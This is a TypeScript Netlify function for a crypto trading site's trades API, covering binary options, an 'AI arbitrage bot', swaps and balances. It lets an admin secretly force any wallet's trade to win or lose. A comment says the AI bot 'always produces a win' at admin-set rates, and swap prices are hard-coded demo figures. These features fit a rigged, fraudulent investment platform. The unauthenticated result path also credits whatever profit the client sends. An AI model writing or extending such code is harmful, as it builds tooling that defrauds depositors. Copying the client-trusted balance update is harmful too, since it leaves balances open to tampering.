import { getStore } from "@netlify/blobs";
import type { Config, Context } from "@netlify/functions";
import {
  secureJson,
  sanitizeString,
  validateAdminSession,
  auditLog,
  getClientIp,
} from "../lib/security.js";

const DEMO_RATES: Record<string, number> = {
  USDT: 1, USDC: 1, ETH: 3200, BTC: 65000, BNB: 600, SOL: 145,
  XRP: 0.58, ADA: 0.45, AVAX: 35, DOGE: 0.15,
};

export default async (req: Request, context: Context) => {
  const store = getStore({ name: "app-data", consistency: "strong" });
  const ip = getClientIp(context);

  if (req.method === "GET") {
    const url = new URL(req.url);
    const wallet = url.searchParams.get("wallet");
    if (!wallet) {
      return secureJson({ error: "Wallet address required" }, 400);
    }
    const trades = (await store.get(`trades-${wallet.toLowerCase()}`, { type: "json" })) as any[] || [];
    return secureJson(trades, 200, true);
  }

  if (req.method === "POST") {
    const body = await req.json();
    const { type, wallet } = body;

    if (!wallet) {
      return secureJson({ error: "Wallet address required" }, 400);
    }

    const safeWallet = sanitizeString(String(wallet), 100).toLowerCase();
    if (!safeWallet) {
      return secureJson({ error: "Invalid wallet address" }, 400);
    }

    // Handle binary trade result (called after timer expires on client)
    if (type === "binary-result") {
      const { profit: clientProfit, tradeId } = body;

      // Load trades first — needed for both the admin override and the status update
      const trades = ((await store.get(`trades-${safeWallet}`, { type: "json" })) as any[]) || [];
      const tradeIdx = trades.findIndex((t: any) => t.id === tradeId);

      // Determine final profit: admin override takes precedence over client value
      let finalProfit = parseFloat(clientProfit);
      const tradeControl = (await store.get(`trade-control-${safeWallet}`, { type: "json" })) as { outcome?: string } | null;
      if (tradeControl?.outcome === "win" || tradeControl?.outcome === "lose") {
        const trade = tradeIdx !== -1 ? trades[tradeIdx] : null;
        if (trade) {
          if (tradeControl.outcome === "win") {
            // Profit based on the level's configured payout percentage
            finalProfit = parseFloat((Number(trade.capital) * Number(trade.profitPercent) / 100).toFixed(2));
          } else {
            // Full capital loss
            finalProfit = -Math.abs(Number(trade.capital));
          }
        }
      }

      // Update balance
      const balance = ((await store.get(`balance-${safeWallet}`, { type: "json" })) || { usdt: 0 }) as { usdt: number };
      balance.usdt = Math.max(0, balance.usdt + finalProfit);
      await store.setJSON(`balance-${safeWallet}`, balance);

      // Update trade status
      if (tradeIdx !== -1) {
        trades[tradeIdx].status = finalProfit >= 0 ? "won" : "lost";
        trades[tradeIdx].profit = finalProfit;
        await store.setJSON(`trades-${safeWallet}`, trades);
      }

      return secureJson({ success: true, newBalance: balance });
    }

    // Admin-only: complete an active AI arbitrage bot trade.
    // AI arbitrage always produces a win — profit is calculated from the level's
    // dailyProfit % × duration × capital (all set by the admin in level config).
    if (type === "ai-bot-complete") {
      const sessionResult = await validateAdminSession(req, store);
      if (!sessionResult.valid) {
        auditLog("AUTH_FAILURE", { operation: "ai-bot-complete", reason: sessionResult.reason, ip });
        return secureJson({ error: "Unauthorized" }, 401);
      }

      const { tradeId } = body;
      const trades = ((await store.get(`trades-${safeWallet}`, { type: "json" })) as any[]) || [];
      const tradeIdx = trades.findIndex((t: any) => t.id === tradeId);

      if (tradeIdx === -1) {
        return secureJson({ error: "Trade not found" }, 404);
      }
      const trade = trades[tradeIdx];
      if (trade.type !== "ai-bot") {
        return secureJson({ error: "Not an AI bot trade" }, 400);
      }
      if (trade.status !== "active") {
        return secureJson({ error: "Trade already completed" }, 400);
      }

      // Profit = capital × dailyProfit% × duration; capital is also returned to the user
      const profit = parseFloat((Number(trade.capital) * Number(trade.dailyProfit) * Number(trade.duration) / 100).toFixed(2));
      const totalCredit = Number(trade.capital) + profit;

      const balance = ((await store.get(`balance-${safeWallet}`, { type: "json" })) || { usdt: 0 }) as { usdt: number };
      balance.usdt = Math.max(0, balance.usdt + totalCredit);
      await store.setJSON(`balance-${safeWallet}`, balance);

      trades[tradeIdx].status = "won";
      trades[tradeIdx].profit = profit;
      trades[tradeIdx].completedAt = new Date().toISOString();
      await store.setJSON(`trades-${safeWallet}`, trades);

      auditLog("ADMIN_WRITE", { operation: "ai-bot-complete", wallet: `${safeWallet.slice(0, 8)}…`, tradeId, profit, ip });

      return secureJson({ success: true, newBalance: balance, profit });
    }

    // Record a new trade
    const trades = ((await store.get(`trades-${safeWallet}`, { type: "json" })) as any[]) || [];
    const newTrade: Record<string, any> = {
      id: Date.now(),
      type: sanitizeString(String(type ?? ""), 32),
      status: "active",
      createdAt: new Date().toISOString(),
    };

    // Copy allowed fields (sanitized)
    const allowed = ["direction", "levelId", "levelName", "capital", "tradingTime",
      "profitPercent", "dailyProfit", "duration", "fromCoin", "toCoin", "amount"];
    for (const field of allowed) {
      if (body[field] !== undefined) {
        newTrade[field] = typeof body[field] === "string"
          ? sanitizeString(body[field], 64)
          : body[field];
      }
    }

    // Swap: calculate estimated output
    if (type === "swap") {
      const fromRate = DEMO_RATES[body.fromCoin] || 1;
      const toRate = DEMO_RATES[body.toCoin] || 1;
      const feeMultiplier = 0.995; // 0.5% fee
      newTrade.estimatedOut = ((body.amount * fromRate) / toRate * feeMultiplier).toFixed(6);
      newTrade.fee = (body.amount * 0.005).toFixed(6);
    }

    trades.unshift(newTrade);
    if (trades.length > 100) trades.length = 100;
    await store.setJSON(`trades-${safeWallet}`, trades);

    return secureJson(newTrade);
  }

  return new Response("Method not allowed", { status: 405 });
};

export const config: Config = {
  path: "/api/trades",
  method: ["GET", "POST"],
};
